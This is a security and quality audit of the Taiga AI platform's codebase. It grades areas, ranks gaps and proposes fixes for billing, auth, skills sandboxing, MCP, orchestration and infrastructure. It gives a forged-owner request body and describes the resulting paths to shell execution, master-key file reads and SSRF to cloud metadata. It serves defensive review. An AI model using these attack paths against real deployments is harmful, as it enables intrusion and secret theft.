# GAP-AUDIT.md — Тайга: «код vs как ДОЛЖНО быть»

> Аудит-веер №2 (13 агентов): сверка реальной реализации с best-practice/требованиями. Дополняет ARCHITECTURE-MAP
> (структура) оценкой КАЧЕСТВА/КОРРЕКТНОСТИ. Это конкретика для Фазы C (закалка) дороги к production-grade.

## Вердикт

Taiga is a genuinely feature-rich, ambitious MVP with several legitimately strong cores — the streaming/failover chat hook, the reserve→refund media job lifecycle, structure-aware RAG chunking, and full-chat agent workers — but it is far from production-grade, and the gap is widest exactly where it matters most: it cannot take a single payment, and a forgeable request-body 'user' field collapses the entire trust model into anonymous-owner RCE, free-money minting, and cross-user data exposure. The through-line is that excellent feature engineering sits on a non-existent security and money foundation: the same spoofable-identity mine recurs across Skills, Storage/Auth, Billing, and Infra, while the runtime (single GIL stdlib server, one mutexed SQLite, base64-in-JSON media, plaintext $HOME secrets, no backups/health/shutdown) cannot safely or horizontally serve the 10k-user target. Secondary but real: several headline AI claims are aspirational rather than implemented — 'fusion' is a single prompt over concatenated text with no consensus logic, agent 'verification' is decorative, event routines never fire, and the 7.8k-line frontend monolith is unmaintainable. Closing the forgeable-caller mine, shipping a real payment+webhook+idempotency path, fixing the base64/backup/secrets infra, and sandboxing skill execution would move Taiga from 'impressive demo that can't safely be exposed or paid for' to a defensible production product; the AI-quality and frontend-architecture work is important but second in line behind not-getting-owned and being-able-to-charge.

## Скоркарта (A–F по областям)

| Оценка | Область | Почему |
|---|---|---|
| **F** | Billing / Balance / Pricing | No payment processor, no webhook, no signature verification, no idempotency; api_topup 503s every real user. A money-maker that literally cannot take a single p |
| **F** | Storage / Persistence + Accounts, Auth & Security | Identity is read from the request-body 'user' field and never verified; {"user":"default"} = owner. Forgeable owner → admin + shell/run_code RCE + arbitrary fil |
| **D** | Skill capability detection + sandboxed execution | Static analyzer and import-time wiring are genuinely good, but the runtime sandbox is broken twice: spoofable owner reaches native run_code_file (host RCE with  |
| **D** | Тайга frontend — chat.tsx + React architecture | A 7803-line single component with 165 useState, 37 ref-mirrors, no store, app-wide prop-drilling, no list virtualization, ~40 statically-imported panels, ErrorB |
| **D** | Production infrastructure / runtime for 10k users | Single GIL-bound stdlib ThreadingHTTPServer on 127.0.0.1, one SQLite file behind one process-wide mutex, base64-in-JSON media, plaintext $HOME secrets, no backu |
| **C** | MCP connectors (JSON-RPC, SSRF, auth, OAuth) | Solid Streamable-HTTP client with caching and graceful re-init, but the existing SSRF redirect guard is NOT wired into the MCP transport (metadata/loopback exfi |
| **C** | Agent-OS: orchestrator, debate, human-in-loop | Solid plumbing and honest UX, but it is a fixed fan-out→synthesize DAG, not a true plan→act→observe→retry loop. Verification runs an LLM judge whose result noth |
| **C+** | Multi-model orchestration — Brain / Council / Beam-Fusion | Real parallel fan-out and full-chat experts, but the headline 'fusion = dedup + consensus + drop single-model hallucinations' is prompt-only over a raw-concaten |
| **C+** | Routines, Scheduler & Automations | Two correct time-based schedulers, but the on_run_done/on_chat_match event path is fully dead (no producer ever fires it) while the UI lets users enable it — an |
| **B-** | Studio / Media generation engines | Video/music reserve→poll→refund→watchdog lifecycle is genuinely well-built, but everything is base64-in-JSON (OOM/DoS on cinema/video/audio with no body-size ca |
| **B-** | Memory, RAG & Grounding | Structure-aware chunking and the hybrid dense+keyword+RRF core are strong, but the anti-hallucination grounding mode and memory retrieval are keyword-only despi |
| **B-** | Chat core + model routing | Streaming/fallback resilience (holdback, no-restart-after-visible-bytes, truncation auto-continue, empty-response fallback) is excellent, but after a silent pro |

## ТОП-10 разрывов (реальность vs идеал, ранжировано)

1. Forgeable identity → forgeable owner: nearly every endpoint reads the caller from the request-body/query 'user' field and never verifies it, so {"user":"default"} = owner. The correct auth.py signed-token system is wired into ~2 of 75 endpoints. This is the single root cause behind the worst security, billing, and RCE holes.
2. Anonymous remote code execution: combined with forgeable owner, /api/chat {"user":"default","dev":true,...} and the skills run path reach raw host subprocess(shell=True) and native run_code_file with the real os.environ/secrets, plus unscoped tool_read_file of the .auth_secret and .cookie_key master keys.
3. The product cannot take money: no payment processor, no webhook, no signature verification anywhere (grep = 0 hits); api_topup 503s every real user. The entire monetization layer is decorative — a money-maker with no revenue path.
4. Free-money + no idempotency on any money op: the global test_topup toggle lets any uid mint up to 1,000,000 RUB of spendable balance, billing.enabled is a single global revenue kill-switch, and topup/meter/charge/refund have no idempotency key so retried webhooks/requests double-credit or double-charge.
5. No backups, no object storage, base64-in-JSON media: all users/wallets/chats/keys live only on one Mac's local disk with no off-host copy or restore path, and full films/videos/audio are returned as base64 inside JSON held 2-3x in RAM with no body-size cap (OOM/DoS).
6. Untrusted skill JS runs in the host page origin via new Function() (not a Worker/iframe/WASM), giving imported skill code full access to window, same-origin fetch with the user's session, and the auth + native-bridge tokens in localStorage. 'изолированный scope' is a misnomer.
7. Single GIL-bound stdlib server + one SQLite file behind one process-wide write mutex, bound to 127.0.0.1 with no TLS/LB, no /healthz, no graceful shutdown, and per-process in-memory state — structurally incapable of safely or horizontally serving 10k users.
8. Single shared Fernet key (co-located with the ciphertext it protects) encrypts every user's cookies, BYOK keys and MCP tokens, while chat logs and personal facts are plaintext — for an uncensored personal AI, one key leak or one file-read tool decrypts every user.
9. Fusion is prompt-only theatre: the headline 'dedup + consensus + drop single-model hallucinations' is a single instruction over a raw-concatenated, 16k-truncated panel with no clustering/voting, and the default council/brain pools are the same 5 correlated models — so 'consensus' is near-meaningless and minority hallucinations often get fused in.
10. Orphan/decorative agent features: the on_run_done/on_chat_match event routines are fully dead (no producer ever fires them) yet the UI lets users enable them, and the orchestrator's verification runs an LLM judge whose result nothing consumes — failed subtasks are synthesized as if they passed and nothing is ever retried.

## ⚡ Быстрые победы (дёшево + ценно — делать первыми)

- Meter the served model (stream_model) instead of the originally-selected model in the non-brain billing branch — a one-line correctness fix on real money (Chat core).
- Wire the MCP transport through the already-existing _ssrf_safe_opener().open(...) in _mcp_rpc and _mcp_ensure — closes redirect-based metadata/loopback SSRF with a two-call change (MCP).
- Delete test_topup as a global gate and remove the billing.enabled global free-bypass — small edits that close the open-mint faucet and revenue kill-switch (Billing).
- Store a target weekday for weekly routines (default = createdTs weekday) instead of hardcoding Mondays — small fix to a misleading user-facing trigger (Routines).
- Fire _routine_fire_event internally next to each emit('done') and on each chat message, or badge the two event triggers 'скоро' in the UI — small change that ends the orphan-promise (Routines).
- Add a Content-Length cap in _body() — a few lines that immediately blunt the base64 OOM/DoS on media endpoints (Studio/Infra).
- Add unauthenticated /healthz and /readyz endpoints and a SIGTERM handler calling srv.shutdown() + final WAL checkpoint — small, unblocks LB health-gating and zero-downtime deploys (Infra).
- Pick the Council synthesizer by bench (max over good) instead of good[0] (first-to-return) — one-line change that makes 'best advisor synthesizes' actually true (Orchestration).
- Surface usage_out['__degrade_note__'] into meta.note after the stream so NanoGPT-path depth/token degradation becomes visible to the user — it is already computed, just never read (Chat core).
- Make price_of fail closed with a max-price floor + log for off-catalog/null-priced models — small guard that stops silent $0 billing (Billing).
- Route Compare members through _subchat_tool_loop (history+RAG) instead of bare 1200-token venice_complete so the side-by-side comparison reflects real model quality (Orchestration).

## Бэклог «довести до спеки» (ранжировано: критично → качество)

| # | Серьёзн./Усилие | Фикс |
|---|---|---|
| 1 | critical/M (1-2 days; the helper is small, the sweep is mechanical but wide) | Add a single resolve_caller(self) that derives uid (and owner flag) ONLY from a verified signed token (auth.uid_from_token / cookie); replace every c.get('user','default') (~75 sites) and stop treating literal 'default' as owner on any network-exposed bind. |
| 2 | critical/M | Gate native run_code_file/tool_shell behind the verified-owner flag from resolve_caller and remove the body-derived is_owner path; jail tool_read_file/list_dir/write_file/edit_file to an allowlisted realpath root and hard-deny .auth_secret/.cookie_key/dotfiles. |
| 3 | critical/M | Run untrusted skill JS in a Web Worker (Blob URL, no DOM) or cross-origin sandboxed iframe (sandbox=allow-scripts, null origin) instead of new Function() on the main page thread; until shipped, show JS skills as code-for-review only, never auto-run. |
| 4 | critical/L (3-5 days incl. webhook, reconciliation, sandbox testing) | Integrate a real PaymentProvider (YooKassa/CloudPayments/BTCPay/NOWPayments): create_invoice → redirect to pay → credit wallet ONLY from a /api/pay/webhook that verifies the processor HMAC/RSA signature with hmac.compare_digest and validates amount+currency+status. |
| 5 | critical/M | Add an idempotency table keyed by (op_type, external_id) and wrap topup/meter/charge_media/refund_media so a replayed webhook or double-clicked/retried request applies exactly once; key media reserve/refund by run_id. |
| 6 | critical/S | Delete test_topup as a global gate; if a test path is needed restrict crediting to is_owner(self.caller) crediting only self, labelled 'test' in the ledger. Remove the billing.enabled global free-bypass in favor of per-account/maintenance gating that still meters. |
| 7 | critical/M | Automated, tested, off-host backups of taiga.db (VACUUM INTO/.backup to object storage on a cron now; Postgres PITR after migration) plus a written, tested restore runbook with RPO/RTO. |
| 8 | critical/M | Add a global Content-Length cap in _body() and stop returning media as base64-in-JSON: write generated image/audio/video to object storage (or local served files) and return URLs; stream the cinema-export MP4 instead of base64-embedding it. |
| 9 | high/L | Replace the single shared Fernet key with per-user envelope encryption (HKDF(master,uid) or versioned keyed envelope), move the master into OS keychain/KMS (not a plaintext sibling file), add rotation, and encrypt chats.data + memory.data at rest. |
| 10 | high/S | In the non-brain branch, meter against stream_model (the model that actually served after silent fallback), not the originally-selected model; pass the served model id into the cost event. |
| 11 | high/M | Make price_of fail closed: an off-catalog/null-priced model must refuse the call or apply a conservative max-price floor and log it, instead of metering at exactly $0; prefer provider-reported usage over the est_tokens len//4 heuristic (use ~3 chars/token for Cyrillic). |
| 12 | high/M | Reserve estimated max cost atomically before doing the work (single lock spanning estimate→reserve), block when balance < estimated need everywhere (not just <=0), reconcile to actual on completion, and wrap BOTH topup paths in _balance_lock. |
| 13 | high/XL | Move off the stdlib ThreadingHTTPServer to ASGI (Starlette/FastAPI) under uvicorn/gunicorn with multiple worker processes behind nginx/Caddy for TLS; migrate the single mutexed SQLite connection to managed Postgres with a connection pool (keep the _db() seam). |
| 14 | high/S | Switch _mcp_rpc and _mcp_ensure from urllib.request.urlopen to _ssrf_safe_opener().open(...), and re-run _is_public_url on each RPC call (pinning the validated IP to close the DNS-rebind TOCTOU). |
| 15 | high/M | Call _fts_index_memory(conn, uid) from save_memory (under lock, fail-safe), index each fact as its own FTS row (not one __memory__ blob), and add memory scanning to the _like_search fallback. |
| 16 | high/M | Embed grounding source chunks and memory facts and run the existing dense+keyword+RRF hybrid over them; reuse _rag_chunks for grounding chunking; default-enable LLM rerank for small candidate sets (or paid tiers). |
| 17 | high/M | Add a media_jobs table (id, uid, kind, provider, request_id, status, reserved, created) written at submit and updated on terminal states, a GET /api/media-job?id= re-attach endpoint, and a startup reconciler that re-polls or refunds orphaned reserved jobs. |
| 18 | high/M | Wire the orchestrator's existing _orchestrate_verifier result into control flow: on verified=False (or empty/error/timeout), re-dispatch just that subtask with the failure reason appended (retry cap ~2) via add_conditional_edges; flag still-failing subtasks in the synth prompt instead of presenting them as clean. |
| 19 | high/S | Add unauthenticated /healthz (process up) and /readyz (DB SELECT 1 + key files present) endpoints, a SIGTERM handler that calls srv.shutdown(), drains in-flight requests/SSE within a deadline, and runs a final WAL checkpoint before exit. |
| 20 | high/S | Fire event routines internally: call _routine_fire_event(uid,'run_done',...) next to each emit('done') at agent run-completion and _routine_fire_event(uid,'chat_match',text) on each chat message (try/except, off-thread). Until wired, badge on_run_done/on_chat_match 'скоро' in the UI. |
| 21 | high/L | Implement real answer-level fusion: annotate the panel with cross-model agreement ('N of M models state X'), use a neutral synthesizer not in the panel (or strip self-attribution), pick the synthesizer by bench not by first-to-return, and replace 16k char-truncation with per-answer budgeting so no member is dropped. |
| 22 | high/L | Externalize coordination state (rate limits, agent permits/answers, per-uid balance lock, caches) to Redis and make app nodes stateless so multiple nodes can run behind a load balancer. |
| 23 | high/L | Implement the MCP OAuth client: parse WWW-Authenticate on 401, do oauth-protected-resource/authorization-server discovery, RFC 7591 dynamic registration, authorization-code+PKCE via /api/mcp/oauth/start+callback, store+refresh tokens encrypted, retry the RPC; route all discovery fetches through _ssrf_safe_opener. |
| 24 | high/L | Extract a memoized MessageRow (React.memo by id) and wrap the message list in react-virtuoso; lazy-import (React.lazy) the ~40 heavy panels so they code-split; lift the inline render-IIFE logic out. |
| 25 | high/XL | Introduce a state store (Zustand or 3-4 Context+useReducer slices) for cross-cutting state (settings/modes/panels/billing), delete the prop-drilling and the 37 'xRef.current = x' stale-closure mirrors, and add a usePersistentState(key,default) hook to collapse the ~100 lines of duplicated localStorage effects. |
| 26 | high/M | Wrap the app root, the extracted MessageList, and each lazy panel in the existing <ErrorBoundary>; add testing-library coverage for use-taiga-chat.ts (SSE/failover/coalescer) and the extracted components before/while decomposing. |
| 27 | med/M | Wrap all balance mutations (incl. both topups) in _balance_lock and convert to atomic SQL UPDATE...WHERE balance>=?; add read-modify-write locking or an optimistic version column for settings/memory/notes blob overwrites. |
| 28 | med/M | Parallelize the Brain multi-expert loop with the same ThreadPoolExecutor pattern Council uses, add a query difficulty short-circuit to Council/Beam (answer with 1 model when not hard) with a per-request member/token budget, and route Compare members through _subchat_tool_loop (history+RAG) instead of bare 1200-token venice_complete. |
| 29 | med/M | Replace debate's exact-phrase/word-set convergence with a cheap LLM convergence judge over ALL prior rounds; store a target weekday for weekly routines (default = createdTs weekday) instead of hardcoding Mondays; meter routine LLM runs before opening MOSTIK_ROUTINES_ALL; add a last-tick heartbeat to both scheduler loops and assert freshness in /sprint. |
| 30 | med/M | Add ingest/update timestamps per chunk and a recency-decay multiplier to fused scores (and overlap*recency in memory_block); batch the embedding pipeline into one call with a local fallback and query-embedding cache; emit an updated meta/'model_switched' event and surface __degrade_note__ when the served model changes mid-stream. |
| 31 | med/M | Replace the substring/prefix provider hacks with an explicit Provider registry (base_url, auth, id_transform, token_param, sub_url, capability flags); make provider_name return None on unknown prefix instead of defaulting to venice; add MCP resources/read + prompts/get + nextCursor pagination + protocol-version adoption. |
| 32 | med/S | Wrap synchronous image/TTS/3D and all media submit calls in a 2-3 attempt retry with backoff on 5xx/timeout/IncompleteRead (keep immediate-fail on 4xx), and charge cinema-export per scene/second of compute or cap concurrent ffmpeg jobs with a semaphore. |

## Детально по областям (фича → вердикт → разрыв → фикс)

### Chat core + model routing — оценка B-
- **Accurate token + cost accounting (meter / est_tokens / price_of / venice_stream usage_out)** — `wrong` [high]
  - разрыв: Silent fallback to a cheaper/pricier model still charges the user at the price of the model they never actually ran. served_by in `done` reports the real model, but the cost event does not. est_tokens fallback skews CIS-language billing.
  - фикс: In the non-brain branch, meter against stream_model (the served model), not `model`. Pass the served model id to the cost event's `model` field. Replace est_tokens len//4 with a ~3 chars/token estimate for Cyrillic (matching the cap_nano_max_tokens assumption of 3 chars/token) or a proper tokenizer,
- **Provider abstraction (resolve_key / provider_name / provider_for / headers_for / chat_completions_url)** — `partial` [med]
  - разрыв: No real interface — provider behavior is encoded as scattered substring/prefix checks. The 'unknown id -> venice' default means a typo'd or new bare model id silently routes to Venice with a Venice key, which can produce wrong-model output or auth errors that look like model errors. RESALE_FORBIDDEN
  - фикс: Introduce a Provider registry keyed by explicit prefix with attributes {base_url, auth_headers_fn, id_transform, token_param, sub_url?}. Make provider_name() raise/return None on unknown prefix instead of defaulting to venice, and have callers handle 'unknown provider' explicitly. Move headers_for/c
- **No silent wrong-model (meta.model vs served model)** — `partial` [med]
  - разрыв: Partial violation of 'no silent wrong-model': the prominent meta.model and the in-prompt self-identification can disagree with the model that actually served the answer.
  - фикс: Emit an updated meta (or a dedicated 'model_switched' event) whenever stream_model changes or venice_stream reports __degrade_note__/swap, and derive the UI-context self-identification from the final served model rather than the pre-fallback one. Surface usage_out['__degrade_note__'] from venice_str
- **Robust streaming with retries + transparent model fallback (venice_stream + chat() stream loop)** — `meets` [low]
  - разрыв: This is the strongest part. Minor: truncation-retry 'continue' (L13903) skips the usage_total += at L13909, so tokens spent on a truncated-then-retried attempt are silently dropped from billing (minor under-charge). Auto-continue resends full convo each round, so prompt_tokens legitimately multiply 
  - фикс: Accumulate u into usage_total before the truncation-retry continue (or carry a running partial-usage tally that survives retries). Document/expose the continuation cost so the per-message cost footer reflects multi-round input billing.
- **route_model heuristic auto-routing (route_model / detect_task / best_for_task / cost tiers)** — `meets` [low]
  - разрыв: Heuristic is regex-on-last-message only (no conversation context, no language-agnostic intent). 'chat' default returns the flagship for any message 220-8000 chars even if trivial. Phantom detection is real (probe-based) and good. detect_task and route_model duplicate near-identical regex blocks.
  - фикс: Optional: fold detect_task and route_model into one classifier; consider a tiny token-overlap or length+punctuation signal beyond the single regex pass. Not load-bearing — current behavior is reasonable and cheap.
- **budget_degrade ladder (budget_degrade + cap_nano_max_tokens + nearest_cheaper + chat() max_spend ladder)** — `meets` [low]
  - разрыв: budget_degrade's __degrade_note__ is written to usage_out but never surfaced to the user in chat() (only the max_spend budget_note reaches meta.note). nearest_cheaper/budget_degrade only fire for NanoGPT-with-active-subscription; users on other providers get no depth/token degradation. The two ladde
  - фикс: Read usage_out['__degrade_note__'] after the stream and merge into meta.note so the user sees why depth/length changed. Consider generalizing the balance-aware cap beyond the NanoGPT-subscription gate. Optionally unify the two degradation ladders.
- **venice_complete service-path resilience + key rotation** — `meets` [low]
  - разрыв: Service-path calls bypass round-robin key rotation (always hit pool key #0), concentrating ban/rate-limit risk on the first key. Functionally fine, mild operational risk.
  - фикс: Have global_key()/service callers use _rotate_key(name, pool_keys(name)) (or route service calls through resolve_key) so service traffic also spreads across the key pool.
  - **главные разрывы:** HIGH: Non-brain billing meters the originally-selected `model`, not the `stream_model` that actually answered after a silent provider fallback (server.py L14141) — user is charged at the wrong model's price; fix: meter(uid, stream_model, ...).; MED: Silent wrong-model surface — meta.model (L13696) is emitted once before streaming and never corrected after a silent fallback or in-venice budget swap; the in-prompt UI self-identification (L13465) also names the pre-fallback model. Only done.served_by reflects reality.; MED: Provider 'abstraction' is substring/prefix hacks (provider_name defaults unknown ids to venice L2260; headers_for/chat_completions_url special-case by URL substring) — fragile and a silent wrong-provider risk; RESALE_FORBIDDEN is empty/dead.

### Multi-model orchestration — Brain / Council / Beam-Fusion / Modes — оценка C+
- **BEAM_FUSION — fusion that dedups + takes consensus + drops single-model hallucinations** — `partial` [high]
  - разрыв: The consensus/dedup/anti-hallucination logic exists ONLY as natural-language hope inside one prompt. A single model eyeballing 5 blobs of text cannot reliably detect that a fact appears in 1/5 vs 4/5 answers — that's exactly the failure mode ensembles are supposed to remove. There is no measurable c
  - фикс: Add a real fusion stage: (1) for short/factual answers, extract candidate claims and do majority voting or at least an explicit agreement matrix passed into the prompt; (2) annotate the panel with cross-model agreement ('N of M models state…') so the judge has a signal, not just text; (3) use a NEUT
- **Programmatic dedup utilities reused for fusion?** — `wrong` [high]
  - разрыв: There is no answer-level dedup/consensus code anywhere; the claim is satisfied only by prompt text. This is the crux of the 'concatenation not fusion' concern in the task.
  - фикс: Implement answer-level consensus as described in the BEAM_FUSION fix above; reuse no existing catalog dedup (it's unrelated).
- **Council (chat_council) — N models think independently then synthesize** — `meets` [med]
  - разрыв: Minor: the DEFAULT seed COUNCIL_DEFAULT_MODELS (2577) is a fixed 5-model list that is IDENTICAL to BRAIN_EXPERT_POOL, and _council_models seeds those first — so the common case is the same 5 models every time regardless of question, and diversity-by-provider only kicks in for the catalog top-up. Syn
  - фикс: In chat_council pick the synthesizer as max(good, key=bench) instead of good[0] (first-returned). Consider task-aware member selection (best_n_for_task) instead of a static list so a code question pulls coders, a reasoning question pulls reasoners.
- **Brain ask_expert — cheap leader triages, escalates to strong expert(s)** — `meets` [med]
  - разрыв: The multi-expert orchestrator runs experts SEQUENTIALLY (`for _em in _experts:` 13946 — no ThreadPoolExecutor) unlike Council which is parallel, so brainExperts=3 triples latency. detect_task is keyword/regex only (Russian stems) so English or paraphrased prompts mis-route to 'general'. The leader↔e
  - фикс: Parallelize the brain expert loop with the same ThreadPoolExecutor pattern Council uses. Make detect_task language-agnostic (cheap classifier or English stems). Cap brainExperts cost explicitly per tier.
- **Cost-awareness across modes** — `partial` [med]
  - разрыв: Within Council/Beam there is NO cost cap — it always runs all N members at full effort and a full synthesizer pass regardless of how trivial the question is (cost-awareness is only in auto-brain/auto-route, not in the explicit multi-model modes). Beam == Council always synthesizes (the beam flag is 
  - фикс: Add a difficulty/length short-circuit in chat_council (if query_is_hard is False, answer with 1 model, skip fan-out). Expose/enforce a per-request token+member budget. Let tier select council member STRENGTH, not just auto modes.
- **Compare mode — show each model's answer, no synthesis** — `meets` [med]
  - разрыв: Compare members use bare venice_complete (13157) with NO history, NO RAG/grounding, NO tool loop and a hard 1200-token cap — strictly weaker than Council members which are full chats. So 'compare' answers can be worse than the same model in normal chat, making the comparison misleading.
  - фикс: Route compare members through _subchat_tool_loop (or at least include history+RAG) so the comparison reflects real per-model quality, not a degraded one-shot.
- **Deep research (chat_research) — plan→search→read→synthesize with sources** — `meets` [med]
  - разрыв: Single-pass, NO verification/adversarial check of claims against sources (FEATURE-INVENTORY-level 'deep research' usually implies fact-checking) — it trusts the synthesizer to 'not invent'. Searches run sequentially (for q in queries) not parallel → slow at deep=8. No dedup of overlapping search res
  - фикс: Parallelize sub-question searches; add a citation-verification pass (claim→source check) for deep; budget context per sub-question instead of global 18k truncation.
- **_subchat_tool_loop — experts/advisors run as full chats (do experts add value)** — `meets` [low]
  - разрыв: Experts genuinely add value individually, but because the default expert pool is the SAME 5 models as council and they all see the SAME context, independence is weak — correlated models produce correlated answers, which undercuts the ensemble premise (consensus among near-identical models is not rea
  - фикс: Diversify the expert pool by lab/architecture per task; optionally vary temperature or give experts slightly different framings to decorrelate, which is what makes fusion meaningful.
  - **главные разрывы:** Fusion is prompt-only: BEAM_FUSION_PROMPT asks one model to dedup/vote/drop-hallucinations over a raw-concatenated, 16k-truncated panel. No programmatic clustering, claim-level agreement, or majority voting exists — so 'consensus' and 'drop single-model hallucinations' are aspirational, not implemented (server.py:2673, 12994, 13973).; Weak ensemble diversity: default Council members AND Brain experts are the SAME fixed 5-model list (COUNCIL_DEFAULT_MODELS == BRAIN_EXPERT_POOL, 2577/2571), all seeing identical context → correlated answers make any 'consensus' near-meaningless.; Council synthesizer = good[0] = first model to RETURN (as_completed), not the strongest (chat_council:12977) — contradicts the 'best advisor synthesizes' intent; the synthesizer is also a panel member and can favor its own answer.

### Agent-OS: orchestrator — оценка C
- **Real plan→act→observe→retry agent loop (orchestrator)** — `partial` [high]
  - разрыв: The top-level orchestration is one-shot fan-out + synthesize. There is no convergence, no re-plan, no retry of a failed/empty/unverified subtask. A subtask that returns '[воркер не дал ответа]' or fails verification is still fed verbatim into synthesis.
  - фикс: Add a verify/route node after workers: collect subtasks where result is empty/error OR verified is False, and add a conditional edge that re-dispatches just those (with the failure reason appended to the prompt) up to a small retry cap (e.g. 2). Optionally add a replan node when >50% of subtasks fai
- **Verification + retry on worker failure (accept-envelope)** — `stub` [high]
  - разрыв: verify runs and reports but never gates or retries. It costs an extra model call per accept-worker and produces a field the pipeline discards — the 'verification' is theatre. Retry-on-failure does not exist at any level.
  - фикс: On verified is False, re-run _worker once with the failure reason injected ('предыдущая попытка не прошла приёмку: <reason>, исправь'); after the retry cap, mark the subtask failed and tell synth_node to flag it ('эта подзадача не выполнена') instead of presenting it as a clean result. Pass verified
- **Error recovery / graceful degradation** — `meets` [med]
  - разрыв: Recovery = 'continue with a placeholder', never 'retry'. A timed-out or errored worker is never re-attempted; its placeholder text flows into synthesis. So robustness is high but quality-recovery is absent (overlaps with the retry gap above).
  - фикс: Pair the existing degradation with a single retry for empty/error/timeout results before falling back to the placeholder, using the same budget guard.
- **Debate convergence (architect↔critic stops correctly)** — `partial` [med]
  - разрыв: Convergence is keyword-fragile, not semantic. (1) If the critic phrases agreement differently ('замечаний нет', 'выглядит хорошо') the regex misses it and debate runs to max_rounds. (2) no_new_issues uses set-difference of words ≥5 chars with a fixed threshold <5 new words (debate.py 80-94) — a crit
  - фикс: Replace the word-set heuristic with a cheap LLM convergence judge (reuse _orchestrate_verifier-style call): 'did the critic raise any NEW substantive issue vs all prior rounds? agreed/remarks'. Accumulate issues across ALL rounds, not just the previous one. Keep the regex as a fast-path but don't re
- **Debate produces/uses a converging blueprint** — `partial` [med]
  - разрыв: No truncation/summarization of arch_history; a 6-round debate re-sends rounds 0-5 in full each turn. blueprint is just 'last architect text', not a structured merge — if the last round was a partial answer to a ВОПРОС it can be thinner than an earlier round.
  - фикс: Summarize older rounds into a running 'state of blueprint + open issues' block instead of re-sending raw history; keep only the last 1-2 raw rounds verbatim. Optionally keep the longest/most-complete architect reply as blueprint rather than strictly the last.
- **Workers are real agents (not one-shot)** — `meets` [low]
  - разрыв: Caveat: in standalone orchestrator.py (no worker_runner, the back-compat path, lines 184-210) a worker is a single _complete call — only the 'researcher' skill gets a one-shot search, no loop. But production always injects worker_runner, so the live behavior meets the bar. The 17 personas are just s
  - фикс: None required for production. If you want personas to matter more, map skills to tool subsets (e.g. coder gets run_code in sandbox, security gets nothing-mutating) instead of prompt-only differentiation.
- **Reliable tool-use** — `meets` [low]
  - разрыв: max_steps is low (2-4 depending on mode/depth), so deep tool chains get truncated mid-investigation — the worker is forced to answer before finishing. Bounded but occasionally too tight for research subtasks.
  - фикс: Raise max_steps for researcher/coder/analyst skills (e.g. 6) and keep it low for trivial ones; you already branch on skill, so thread a per-skill step budget through _head.
- **Human-in-the-loop question-gate (fires end-to-end)** — `meets` [low]
  - разрыв: (1) Only the architect can ask; the critic and orchestrator workers cannot (worker autonomy directive explicitly forbids worker questions, server.py 6562-6566 — a deliberate but limiting choice). (2) The wait blocks the single SSE handler thread for up to 180s; in stdlib http.server this ties up a w
  - фикс: Persist pending questions (so restart-survivable), and consider allowing one clarifying question from the orchestrator planner too (gated, owner-only) for genuinely ambiguous tasks. The 180s thread-block is acceptable for this stdlib server but document it; long-term move to an async/poll model.
- **Convergence/stop reporting honesty** — `meets` [low]
  - разрыв: Minor: 'no_new_issues' is reported as converged=True even though it can mean 'the critic got stuck repeating itself', which is a stall, not agreement. Conflating stall with consensus slightly overstates quality.
  - фикс: Distinguish converged (agreed) from stalled (no_new_issues / max_rounds) in the returned 'converged' boolean, or add a separate 'consensus' vs 'stalled' field so the UI can tell the user the difference.
  - **главные разрывы:** No true agent loop at the orchestration level: orchestrator.py is a fixed plan→workers→synth DAG with no feedback edge — no re-plan, no observe-and-react, no retry. The only real act→observe loop lives inside a single worker (_subchat_tool_loop).; Verification is decorative: _orchestrate_verifier runs an LLM judge and attaches verified/verify_reason, but no code path consumes it — failed/unverified subtasks are synthesized as if they passed, and nothing is ever retried.; Debate convergence is keyword/heuristic-fragile: 'agreed' is an exact-phrase regex and 'no_new_issues' is a ≥5-char word-set diff vs only the previous round — a reworded same issue blocks convergence and a differently-phrased agreement is missed; needs a semantic convergence judge over all rounds.

### MCP — оценка C
- **SSRF safety on EVERY MCP request including redirects** — `wrong` [high]
  - разрыв: MCP transport bypasses the existing SSRF redirect guard entirely; redirect-based SSRF to cloud metadata / internal services is fully exploitable on any added connector. FEATURE-INVENTORY explicitly claims 'Anti-SSRF for outbound fetches incl. redirect-hop revalidation' (line 162) — for MCP this clai
  - фикс: In _mcp_rpc and _mcp_ensure, replace urllib.request.urlopen(req, ...) with _ssrf_safe_opener().open(req, ...). Additionally, re-run _is_public_url(server['url']) at the top of _mcp_rpc (cheap, defends DNS-rebind TOCTOU between add-time and call-time). Consider an opener that also pins the validated 
- **OAuth flow for connectors that require it (GitHub, Notion)** — `missing` [high]
  - разрыв: The task's requirement 'oauth flow works' is unmet; GitHub/Notion can only be used if the user manually obtains a token out-of-band, which for a true OAuth-only MCP server may be impossible. The marketplace advertises a capability the backend cannot deliver.
  - фикс: Implement the MCP OAuth client: parse WWW-Authenticate on 401, fetch /.well-known/oauth-protected-resource and oauth-authorization-server metadata, do RFC 7591 dynamic client registration, run an authorization-code+PKCE flow via a new /api/mcp/oauth/start + /api/mcp/oauth/callback pair, store access
- **DNS-rebinding / TOCTOU on the SSRF allowlist** — `partial` [med]
  - разрыв: Time-of-check/time-of-use: the one-time check at registration does not protect the repeated RPC calls.
  - фикс: Validate the host on each _mcp_rpc call AND pin/connect to the IP that passed validation (custom opener that resolves once and reuses the IP, sending the original Host header).
- **JSON-RPC spec coverage (initialize / tools / resources / prompts)** — `partial` [med]
  - разрыв: Resources and prompts are list-only dead weight (no read/get), and any paginated tools/resources list is truncated to the first page.
  - фикс: Add mcp_read_resource (resources/read) and mcp_get_prompt (prompts/get); loop on result.nextCursor in tools/list, resources/list, prompts/list to gather all pages; read server capabilities from the initialize result and skip unsupported method families instead of probing-and-swallowing.
- **Auth token handling & secret hygiene** — `meets` [med]
  - разрыв: Token is injected into requests that follow unguarded redirects (see SSRF finding) — a malicious public MCP server could 302 the request (with the Authorization header) toward an attacker-controlled or internal host, leaking the user's GitHub/Notion token. urllib does strip Authorization on cross-ho
  - фикс: Once the SSRF redirect guard is wired in (primary fix), also ensure auth headers are dropped on any cross-origin redirect hop; never send the token to a host that differs from the registered one.
- **Protocol-version negotiation** — `wrong` [low]
  - разрыв: No negotiation; a server that only speaks an older/newer version, or requires the MCP-Protocol-Version header, may break or behave inconsistently.
  - фикс: Capture result.protocolVersion from initialize, store it per server, and echo it in the MCP-Protocol-Version header on all subsequent requests. Fall back gracefully if the server rejects the requested version.
- **Caching (tools / resources / prompts)** — `meets` [low]
  - разрыв: Minor: caches are plain module-global dicts mutated from multiple request threads under ThreadingHTTPServer (server.py:14755) with no lock — _mcp_sessions/_mcp_inited/_mcp_*_cache can race (lost session-id, duplicate inits). Also no negative-result/short-TTL distinction (a transient failure caches a
